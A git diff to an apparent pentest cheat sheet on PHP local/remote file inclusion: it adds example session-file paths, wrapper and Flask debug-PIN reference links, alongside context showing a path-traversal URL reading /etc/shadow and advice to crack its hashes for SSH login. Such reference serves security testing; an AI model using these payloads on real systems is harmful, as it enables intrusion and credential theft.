@@ -116,6 +116,8 @@ When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still pos
 
 ## LFI / RFI using wrappers
 
+Some exploit protocol: https://www.cdxy.me/?p=752
+
 ### Wrapper php://filter
 
 The part "php://filter" is case insensitive
@@ -369,6 +371,11 @@ In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] or /var/lib
 
 ```javascript
 /var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
+/var/lib/php/sessions/sess_n7p2nh1q3njpcpq3p09lc3f6ku
+/var/lib/php/sessions/sess_t41thad8p08rn057hhak40p0kj
+/var/lib/php5/sess_t41thad8p08rn057hhak40p0kj
+/tmp/sess_t41thad8p08rn057hhak40p0kj
+
 user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
 ```
 
@@ -408,6 +415,12 @@ http://example.com/index.php?page=../../../../../../etc/shadow
 ```
 
 Then crack the hashes inside in order to login via SSH on the machine.
+
+### Flask Debug PIN via LFI
+More info in: https://github.com/nhthongDfVn/payload/tree/master/Web/WERKZEUG 
+Example:
+1. https://sttt.gitlab.io/posts/tetctf-2020-web-writeup/?fbclid=IwAR0NpKYSvinfCw2-FeD2MsrEDVZGjKtwwf1202t7M2glrhnvEz1_L39zVQI (tsug0d challenge)
+
 
 ## References
 
